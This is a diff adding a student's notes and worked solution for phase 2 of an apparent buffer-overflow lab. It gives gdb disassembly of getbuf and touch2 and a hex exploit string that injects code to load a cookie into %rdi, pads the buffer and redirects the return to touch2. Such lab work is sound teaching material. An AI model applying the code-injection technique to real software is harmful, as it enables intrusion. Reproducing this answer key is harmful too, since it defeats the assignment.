@@ -1,0 +1,49 @@
+phase 2:
+Want to changee the return control of getbuf to rerout to touch2
+want to modify %rdi ad store the cookie in it
+want to do this because touch2 takes a parameter and you want to pass your cookie through
+therefore you need to place the value of cooki into rdi
+
+gdb ctarget
+Disas getbuf
+getbuf()
+ 0x000000000040181b <+0>:     sub    $0x18,%rsp
+ 0x000000000040181f <+4>:     mov    %rsp,%rdi
+ 0x0000000000401822 <+7>:     callq  0x401a5a <Gets>
+ 0x0000000000401827 <+12>:    mov    $0x1,%eax
+ 0x000000000040182c <+17>:    add    $0x18,%rsp
+ 0x0000000000401830 <+21>:    retq
+Disas touch2:
+touch2()
+ 0x000000000040185d <+0>:     sub    $0x8,%rsp
+ 0x0000000000401861 <+4>:     mov    %edi,%esi
+ 0x0000000000401863 <+6>:     movl   $0x2,0x202c8f(%rip)        # 0x6044fc <vlevel>
+ 0x000000000040186d <+16>:    cmp    0x202c91(%rip),%edi        # 0x604504 <cookie>
+ 0x0000000000401873 <+22>:    jne    0x401890 <touch2+51>
+ 0x0000000000401875 <+24>:    mov    $0x402fe8,%edi
+ 0x000000000040187a <+29>:    mov    $0x0,%eax
+ 0x000000000040187f <+34>:    callq  0x400c80 <printf@plt>
+ 0x0000000000401884 <+39>:    mov    $0x2,%edi
+ 0x0000000000401889 <+44>:    callq  0x401c49 <validate>
+ 0x000000000040188e <+49>:    jmp    0x4018a9 <touch2+76>
+ 0x0000000000401890 <+51>:    mov    $0x403010,%edi
+ 0x0000000000401895 <+56>:    mov    $0x0,%eax
+ 0x000000000040189a <+61>:    callq  0x400c80 <printf@plt>
+ 0x000000000040189f <+66>:    mov    $0x2,%edi
+ 0x00000000004018a4 <+71>:    callq  0x401cfb <fail>
+ 0x00000000004018a9 <+76>:    mov    $0x0,%edi
+ 0x00000000004018ae <+81>:    callq  0x400df0 <exit@plt>
+
+My Cookie: 0x6ea28ad7
+rsp: 0x55622bd8
+touch2: 0x40185d
+
+Everything has to be little endian, that how its organized
+48 c7 c7 is the assembly code of the move function while c3 is the assembly code for the return
+
+Solution:
+48 c7 c7 d7 8a a2 6e c3 //notice that the cookie address is in between c7 c3 in little endian
+00 00 00 00 00 00 00 00 //these two lines are the padding necessary to ovrflow the buffer
+00 00 00 00 00 00 00 00
+d8 2b 62 55 00 00 00 00 //address of rsp 
+5d 18 40 00 00 00 00 00 //address of touch 2, aka where you want to reroute retur control
